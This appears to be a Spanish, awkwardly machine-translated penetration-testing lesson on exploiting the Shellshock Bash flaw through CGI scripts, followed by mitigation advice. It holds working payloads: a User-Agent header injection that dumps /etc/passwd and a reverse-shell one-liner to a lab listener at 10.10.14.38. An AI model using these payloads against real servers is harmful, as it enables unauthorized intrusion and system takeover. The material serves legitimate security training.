# Attacking CGI Applications - Shellshock

A[Interfaz Common Gateway (CGI)](https://www.w3.org/CGI/)se utiliza para ayudar a un servidor web a representar páginas dinámicas y crear una respuesta personalizada para que el usuario realice una solicitud a través de una aplicación web. Las aplicaciones CGI se utilizan principalmente para acceder a otras aplicaciones que se ejecutan en un servidor web. CGI es esencialmente middleware entre servidores web, bases de datos externos y fuentes de información. Los scripts y programas de CGI se mantienen en el`/CGI-bin`Directorio en un servidor web y se puede escribir en C, C ++, Java, Perl, etc. Los scripts CGI se ejecutan en el contexto de seguridad del servidor web. A menudo se usan para libros de invitados, formularios (como correo electrónico, comentarios, registro), listas de correo, blogs, etc. Estos scripts son independientes del lenguaje y se pueden escribir muy simplemente para realizar tareas avanzadas mucho más fáciles que escribirlas utilizando lenguajes de programación del lado del servidor.

Los scripts/aplicaciones CGI se usan típicamente por algunas razones:

- Si el servidor web debe interactuar dinámicamente con el usuario
- Cuando un usuario envía datos al servidor web completando un formulario. La aplicación CGI procesaría los datos y devolvería el resultado al usuario a través del servidor web

Una representación gráfica de cómo funciona CGI a continuación.

![](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

[Fuente gráfica](https://www.tcl.tk/man/aolserver3.0/cgi.gif)

En términos generales, los pasos son los siguientes:

- Se crea un directorio en el servidor web que contiene los scripts/aplicaciones CGI. Este directorio se llama típicamente`CGI-bin`.
- El usuario de la aplicación web envía una solicitud al servidor a través de una URL, es decir, https://acme.com/cgi-bin/newchiscript.pl
- El servidor ejecuta el script y pasa la salida resultante nuevamente al cliente web

Hay algunas desventajas para usarlos: el programa CGI inicia un nuevo proceso para cada solicitud HTTP que puede ocupar mucha memoria del servidor. Se abre una nueva conexión de base de datos cada vez. Los datos no se pueden almacenar en caché entre las cargas de página, lo que reduce la eficiencia. Sin embargo, los riesgos y las ineficiencias superan los beneficios, y CGI no se ha mantenido al día con los tiempos y no ha evolucionado para funcionar bien con las aplicaciones web modernas. Ha sido reemplazado por tecnologías más rápidas y seguras. Sin embargo, como probadores, nos encontraremos con aplicaciones web de vez en cuando que todavía usan CGI y a menudo lo veremos cuando encontremos dispositivos integrados durante una evaluación.

---

# **Ataques CGI**

Quizás el ataque CGI más conocido es explotar la vulnerabilidad de Shellshock (también conocido como "Bash Bug") a través de CGI. La vulnerabilidad de la cáscara ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) se descubrió en 2014, es relativamente simple de explotar y aún se puede encontrar en la naturaleza (durante las pruebas de penetración) de vez en cuando. Es una falla de seguridad en el shell de Bash (GNU Bash hasta la versión 4.3) que puede usarse para ejecutar comandos involuntarios utilizando variables de entorno. En el momento del descubrimiento, era un error de 25 años y una amenaza significativa para las empresas de todo el mundo.

---

# **Shellshock a través de CGI**

La vulnerabilidad de Shellshock permite que un atacante explote versiones antiguas de BASH que guarde las variables de entorno incorrectamente. Por lo general, al guardar una función como una variable, la función de shell se detendrá donde el creador la define para terminar. Las versiones vulnerables de Bash permitirán a un atacante ejecutar comandos del sistema operativo que se incluyen después de una función almacenada dentro de una variable de entorno. Veamos un ejemplo simple en el que definimos una variable de entorno e incluyamos un comando malicioso después.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

Cuando se asigna la variable anterior, Bash interpretará el`y='() { :;};'`porción como definición de función para una variable`y`. La función no hace nada más que devolver un código de salida`0`, pero cuando se importa, ejecutará el comando`echo vulnerable-shellshock`Si la versión de Bash es vulnerable. Este (o cualquier otro comando, como una línea de un enlace de Shell Inverse) se ejecutará en el contexto del usuario del servidor web. La mayoría de las veces, este será un usuario como`www-data`, y tendremos acceso al sistema, pero aún así necesitamos aumentar los privilegios. De vez en cuando tendremos mucha suerte y obtendremos acceso como el`root`Usuario si el servidor web se ejecuta en un contexto elevado.

Si el sistema no es vulnerable, solo`"not vulnerable"`se imprimirá.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"not vulnerable

```

Este comportamiento ya no ocurre en un sistema parcheado, ya que Bash no ejecutará código después de que se importe una definición de función. Además, Bash ya no interpretará`y=() {...}`como una definición de función. Pero más bien, las definiciones de funciones dentro de las variables de entorno ahora deben tener prefijo`BASH_FUNC_`.

---

# **Ejemplo práctico**

Veamos un ejemplo práctico para ver cómo nosotros, como pentesters, podemos encontrar y explotar este defecto.

### **Enumeración - Gobuster**

Podemos buscar scripts CGI utilizando una herramienta como`Gobuster`. Aquí encontramos uno`access.cgi`.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
xnoxos@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]

===============================================================
2023/03/23 09:26:29 Finished

```

A continuación, podemos curlar el script y notar que no se nos sale nada, por lo que quizás sea un script desaparecido, pero aún vale la pena explorar más.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
xnoxos@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgiHTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html

```

### **Confirmando la vulnerabilidad**

Para verificar la vulnerabilidad, podemos usar un simple`cURL`Comando o use el repetidor o intruso de la suite BURP para borrar el campo de agente de usuario. Aquí podemos ver que el contenido del`/etc/passwd`El archivo se nos devuelve, confirmando así la vulnerabilidad a través del campo de agente de usuario.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
xnoxos@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgiroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash

```

### **Explotación para revertir el acceso de la carcasa**

Una vez que se ha confirmado la vulnerabilidad, podemos obtener el acceso a la carcasa inversa de muchas maneras. En este ejemplo, usamos una línea de una sola y obtenemos una devolución de llamada en nuestro oyente de NetCat.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
xnoxos@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Desde aquí, podríamos comenzar a buscar datos confidenciales o intentar aumentar los privilegios. Durante una prueba de penetración de red, podríamos intentar usar este host para pivotar en la red interna.

Attacando aplicaciones de interfaz de puerta de enlace común (CGI) - Shellshock

```
xnoxos@htb[/htb]$ sudo nc -lvnp 7777listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ idid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$

```

---

# **Mitigación**

Este[blog](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)Contiene consejos útiles para mitigar la vulnerabilidad de la cáscara. La forma más rápida de remediar la vulnerabilidad es actualizar la versión de BASH en el sistema afectado. Esto puede ser más complicado en los sistemas Ubuntu/Debian al final de la vida, por lo que un Sysadmin puede tener primero en actualizar el Administrador de paquetes. Con ciertos sistemas (es decir, dispositivos IoT que usan CGI), la actualización puede no ser posible. En estos casos, sería mejor asegurarse de que el sistema no esté expuesto a Internet y luego evalúe si el host puede ser desmantelado. Si se trata de un anfitrión crítico y la organización elige aceptar el riesgo, una solución temporal podría estar en firewall en el host en la red interna lo mejor posible. Tenga en cuenta que esto solo está poniendo una bandaid en una gran herida, y el mejor curso de acción sería actualizar o llevar al host fuera de línea.

---

# **Pensamientos de cierre**

Shellshock es una vulnerabilidad heredada que ahora tiene casi una década. Pero solo por su edad, eso no significa que no nos encontraremos con eso ocasionalmente. Si se encuentra con alguna aplicación web que usa scripts CGI durante sus evaluaciones (especialmente los dispositivos IoT), definitivamente vale la pena cavar en los pasos que se muestran en esta sección. ¡Puede tener un punto de apoyo relativamente simple que te espera!